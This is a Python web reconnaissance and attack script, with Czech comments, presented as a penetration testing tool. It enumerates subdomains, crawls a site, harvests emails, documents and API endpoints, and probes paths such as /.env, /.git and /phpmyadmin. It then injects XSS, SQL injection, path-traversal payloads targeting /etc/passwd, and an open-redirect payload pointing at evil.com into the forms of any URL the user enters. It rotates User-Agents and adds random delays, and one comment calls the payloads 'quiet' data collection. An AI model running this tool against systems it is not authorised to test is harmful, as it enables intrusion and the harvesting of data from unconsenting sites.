#!/usr/bin/env python3
import requests
import json
import time
import random
import argparse
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich import print as rprint

# --- KONFIGURACE ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
]
# Rozšířený slovník pro subdomény
SUBDOMAIN_WORDLIST = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "staging", "old", "new", "db", "cpanel", "webmail", "secure", "vpn", "portal"]
# Payloady pro "tichý" sběr dat
XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; SELECT SLEEP(5)--"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname"]
OPEN_REDIRECT_PAYLOAD = "//evil.com"
# Common directories for dirbusting
COMMON_DIRS = ["/admin", "/login", "/dashboard", "/config", "/backup", "/.git", "/.env", "/phpinfo.php", "/server-status", "/wp-admin", "/adminer.php", "/phpmyadmin", "/test", "/dev", "/api", "/v1", "/v2"]

# --- GLOBÁLNÍ PROMĚNNÉ PRO UKLÁDÁNÍ ---
HARVESTED_DATA = {
    "target": "",
    "ip_address": "",
    "subdomains": [],
    "technologies": [],
    "emails": [],
    "interesting_files": [],
    "api_endpoints": [],
    "vulnerabilities": []
}
console = Console()

# --- POMOCNÉ FUNKCE ---
def get_random_headers():
    return {'User-Agent': random.choice(USER_AGENTS), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

def delay_request():
    time.sleep(random.uniform(0.5, 2.0))

# --- FÁZE 1: PRŮZKUM ---
def get_ip_address(url):
    try:
        domain = urlparse(url).netloc
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return "N/A"

def enumerate_subdomains(domain, session):
    found_subdomains = set()
    base_domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
        task = progress.add_task(f"[yellow]Enumerating subdomains for {base_domain}...", total=len(SUBDOMAIN_WORDLIST))
        for word in SUBDOMAIN_WORDLIST:
            subdomain = f"https://{word}.{base_domain}"
            try:
                r = session.get(subdomain, headers=get_random_headers(), timeout=3, allow_redirects=True)
                if r.status_code < 400:
                    found_subdomains.add(subdomain)
                    console.print(f"[+] Found subdomain: [cyan]{subdomain}[/cyan] (Status: {r.status_code})")
            except requests.RequestException:
                pass
            progress.advance(task)
            delay_request()
    return list(found_subdomains)

def discover_technologies(url, session):
    tech = set()
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        content = r.text.lower()
        headers = r.headers
        
        # Detekce z hlaviček
        if 'x-powered-by' in headers:
            tech.add(f"Powered-By: {headers['x-powered-by']}")
        if 'server' in headers:
            tech.add(f"Server: {headers['server']}")
            
        # Detekce z obsahu (zjednodušená Wappalyzer logika)
        if 'wp-content' in content or 'wp-includes' in content:
            tech.add("WordPress")
        if 'joomla' in content:
            tech.add("Joomla")
        if 'drupal' in content:
            tech.add("Drupal")
        if 'generator" content="shopify' in content:
            tech.add("Shopify")
        if 'src="/static/' in content or 'href="/static/' in content:
            tech.add("Possible Python Framework (Django/Flask)")
    except requests.RequestException:
        pass
    return list(tech)

def crawl_website(url, session, max_pages=50):
    visited = set()
    to_visit = [url]
    found_urls = set([url])
    while to_visit and len(visited) < max_pages:
        current = to_visit.pop(0)
        if current in visited:
            continue
        visited.add(current)
        try:
            r = session.get(current, headers=get_random_headers(), timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(current, link['href'])
                if urlparse(full_url).netloc == urlparse(url).netloc and full_url not in found_urls:
                    found_urls.add(full_url)
                    if full_url not in visited:
                        to_visit.append(full_url)
        except requests.RequestException:
            pass
    return list(found_urls)

def extract_emails_and_files(url, session):
    emails = set()
    files = set()
    api_endpoints = set()
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Emaily
        for mailto in soup.select('a[href^="mailto:"]'):
            email = mailto['href'].replace('mailto:', '')
            emails.add(email)

        # Zajímavé soubory (pdf, doc, xls)
        for link in soup.find_all('a', href=True):
            href = link['href'].lower()
            if any(ext in href for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx']):
                full_url = urljoin(url, link['href'])
                files.add(full_url)
            if '/api/' in href:
                api_endpoints.add(urljoin(url, href))

    except requests.RequestException:
        pass
    return list(emails), list(files), list(api_endpoints)

def check_robots_and_sitemap(url, session):
    robots_url = urljoin(url, '/robots.txt')
    sitemap_url = urljoin(url, '/sitemap.xml')
    robots_content = ""
    sitemap_content = ""
    try:
        r = session.get(robots_url, headers=get_random_headers(), timeout=10)
        if r.status_code == 200:
            robots_content = r.text
    except:
        pass
    try:
        r = session.get(sitemap_url, headers=get_random_headers(), timeout=10)
        if r.status_code == 200:
            sitemap_content = r.text
    except:
        pass
    return robots_content, sitemap_content

def check_ssl_and_headers(url, session):
    ssl_info = "Not HTTPS"
    headers_info = {}
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        headers_info = dict(r.headers)
        if url.startswith("https"):
            ssl_info = "HTTPS enabled"
            # Check for HSTS, etc.
            if 'Strict-Transport-Security' in headers_info:
                ssl_info += " (HSTS present)"
            else:
                ssl_info += " (No HSTS)"
        else:
            ssl_info = "HTTP only - vulnerable to MITM"
    except:
        pass
    return ssl_info, headers_info

def dir_bust(url, session, wordlist):
    exposed_dirs = []
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
        task = progress.add_task(f"[yellow]Dirbusting {url}...", total=len(wordlist))
        for word in wordlist:
            test_url = urljoin(url, word)
            try:
                r = session.get(test_url, headers=get_random_headers(), timeout=5)
                if r.status_code == 200:
                    # Filter out default pages or redirects
                    content = r.text.lower()
                    if not any(default in content for default in ["apache", "nginx", "iis", "404", "not found", "forbidden"]) or len(content) > 1000:
                        exposed_dirs.append({"url": test_url, "status": r.status_code, "size": len(content)})
                        console.print(f"[red]Exposed: [cyan]{test_url}[/cyan] (Status: {r.status_code}, Size: {len(content)})")
            except requests.RequestException:
                pass
            progress.advance(task)
            delay_request()
    return exposed_dirs

# --- FÁZE 2: SKENOVÁNÍ A ÚTOK ---
def scan_and_exploit(url, session):
    vulnerabilities = []
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Sken formulářů
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action)
            inputs = {inp.get('name'): 'test' for inp in form.find_all('input') if inp.get('name')}

            # XSS Test
            test_data = {k: XSS_PAYLOAD for k in inputs.keys()}
            res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
            if XSS_PAYLOAD in res.text:
                vulnerabilities.append({"type": "XSS", "url": form_url, "payload": XSS_PAYLOAD, "method": method, "details": "Reflected XSS found in form."})
                delay_request()
                continue # Na jednom formuláři stačí najít jednu věc

            # SQLi Test
            for payload in SQLI_PAYLOADS:
                test_data = {k: payload for k in inputs.keys()}
                try:
                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
                    if any(error in res.text.lower() for error in ["sql", "mysql", "syntax", "database"]):
                        vulnerabilities.append({"type": "SQLi", "url": form_url, "payload": payload, "method": method, "details": "Possible SQL injection vulnerability."})
                        break
                except:
                    pass
                delay_request()

            # Open Redirect Test
            test_data = {k: OPEN_REDIRECT_PAYLOAD for k in inputs.keys()}
            try:
                res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10, allow_redirects=False) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10, allow_redirects=False)
                if 'location' in res.headers and 'evil.com' in res.headers['location']:
                    vulnerabilities.append({"type": "Open Redirect", "url": form_url, "payload": OPEN_REDIRECT_PAYLOAD, "method": method, "details": "Open redirect vulnerability."})
            except:
                pass
            delay_request()

    except Exception as e:
        print(f"Error during scan: {e}")
    return vulnerabilities

def run_scan(target_url):
    session = requests.Session()

    # Phase 1: Reconnaissance
    console.print("[bold green]Phase 1: Reconnaissance[/bold green]")
    HARVESTED_DATA["target"] = target_url
    HARVESTED_DATA["ip_address"] = get_ip_address(target_url)
    HARVESTED_DATA["subdomains"] = enumerate_subdomains(target_url, session)
    HARVESTED_DATA["technologies"] = discover_technologies(target_url, session)
    emails, files, apis = extract_emails_and_files(target_url, session)
    HARVESTED_DATA["emails"] = emails
    HARVESTED_DATA["interesting_files"] = files
    HARVESTED_DATA["api_endpoints"] = apis
    HARVESTED_DATA["all_urls"] = crawl_website(target_url, session, max_pages=50)  # Increased to 50 pages
    robots, sitemap = check_robots_and_sitemap(target_url, session)
    HARVESTED_DATA["robots_txt"] = robots
    HARVESTED_DATA["sitemap_xml"] = sitemap
    HARVESTED_DATA["exposed_dirs"] = dir_bust(target_url, session, COMMON_DIRS)
    ssl_info, headers_info = check_ssl_and_headers(target_url, session)
    HARVESTED_DATA["ssl_info"] = ssl_info
    HARVESTED_DATA["headers"] = headers_info

    # Phase 2: Scanning and Exploitation
    console.print("[bold red]Phase 2: Scanning and Exploitation[/bold red]")
    all_vulns = []
    # Scan main page
    all_vulns.extend(scan_and_exploit(target_url, session))
    # Scan some crawled pages for forms (limit to 5)
    for page in HARVESTED_DATA["all_urls"][:5]:
        all_vulns.extend(scan_and_exploit(page, session))
    HARVESTED_DATA["vulnerabilities"] = all_vulns

    # Display results in organized sections
    console.print("\n[bold blue]=== SCAN RESULTS ===[/bold blue]")

    # Basic Info
    ssl = HARVESTED_DATA.get("ssl_info", "Unknown")
    panel = Panel(f"Target: {HARVESTED_DATA['target']}\nIP: {HARVESTED_DATA['ip_address']}\nSSL: {ssl}\nTechnologies: {', '.join(HARVESTED_DATA['technologies']) if HARVESTED_DATA['technologies'] else 'None'}",
                  title="Basic Information", border_style="green")
    console.print(panel)

    # Discovered URLs
    urls = HARVESTED_DATA.get("all_urls", [])
    if urls:
        url_list = "\n".join(urls[:20]) + ("\n... and more" if len(urls) > 20 else "")
        panel = Panel(url_list, title=f"Discovered URLs ({len(urls)} total)", border_style="blue")
        console.print(panel)

    # Exposed Directories
    exposed = HARVESTED_DATA.get("exposed_dirs", [])
    if exposed:
        exp_list = "\n".join(f"{e['url']} (Status: {e['status']}, Size: {e['size']})" for e in exposed)
        panel = Panel(exp_list, title="Exposed Directories/Files", border_style="red")
        console.print(panel)

    # Emails and Files
    emails = HARVESTED_DATA.get("emails", [])
    files = HARVESTED_DATA.get("interesting_files", [])
    apis = HARVESTED_DATA.get("api_endpoints", [])
    info = f"Emails: {', '.join(emails) if emails else 'None'}\nFiles: {', '.join(files) if files else 'None'}\nAPIs: {', '.join(apis) if apis else 'None'}"
    panel = Panel(info, title="Extracted Data", border_style="yellow")
    console.print(panel)

    # Vulnerabilities
    vulns = HARVESTED_DATA.get("vulnerabilities", [])
    if vulns:
        vuln_list = "\n".join(f"- {v['type']} at {v['url']} ({v['details']})" for v in vulns)
        panel = Panel(vuln_list, title=f"Vulnerabilities Found ({len(vulns)})", border_style="red", style="bold red")
        console.print(panel)
    else:
        console.print("[green]No vulnerabilities found.[/green]")

    # Other
    subdomains = HARVESTED_DATA.get("subdomains", [])
    if subdomains:
        panel = Panel("\n".join(subdomains), title="Subdomains", border_style="cyan")
        console.print(panel)

    robots = HARVESTED_DATA.get("robots_txt", "")
    if robots:
        panel = Panel(robots[:500] + "..." if len(robots) > 500 else robots, title="Robots.txt", border_style="magenta")
        console.print(panel)

    sitemap = HARVESTED_DATA.get("sitemap_xml", "")
    if sitemap:
        panel = Panel(sitemap[:500] + "..." if len(sitemap) > 500 else sitemap, title="Sitemap.xml", border_style="magenta")
        console.print(panel)

    # Headers
    headers = HARVESTED_DATA.get("headers", {})
    if headers:
        header_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
        panel = Panel(header_str, title="Response Headers", border_style="white")
        console.print(panel)

def interactive_menu():
    while True:
        console.print("\n[bold cyan]Penetration Testing Tool Menu[/bold cyan]")
        console.print("[1] Scan a website")
        console.print("[2] Exit")
        choice = input("Choose an option: ").strip()
        if choice == "1":
            url = input("Enter target URL (e.g., https://example.com): ").strip()
            if url:
                run_scan(url)
            else:
                console.print("[red]Invalid URL.[/red]")
        elif choice == "2":
            console.print("[green]Exiting...[/green]")
            break
        else:
            console.print("[red]Invalid choice. Try again.[/red]")

if __name__ == "__main__":
    interactive_menu()